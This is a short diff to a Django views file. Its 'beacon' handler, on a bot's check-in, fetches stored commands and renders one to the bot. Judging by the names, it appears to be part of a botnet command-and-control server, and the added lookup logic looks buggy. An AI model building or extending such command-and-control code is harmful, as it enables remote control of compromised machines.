@@ -40,6 +40,12 @@ def beacon(request):
         if bot:
             bot.lastSeen = t
             bot.save()
+            cmd = Command.objects.all()
+            x = None
+            for command in cmd:
+                x = command
+            context = {'bot' : x['botId'], 'cmd' : x['cmd']}
+            return render(request, 'run.html', context)
     return render(request, 'index.html')
 
 def cmd(request):
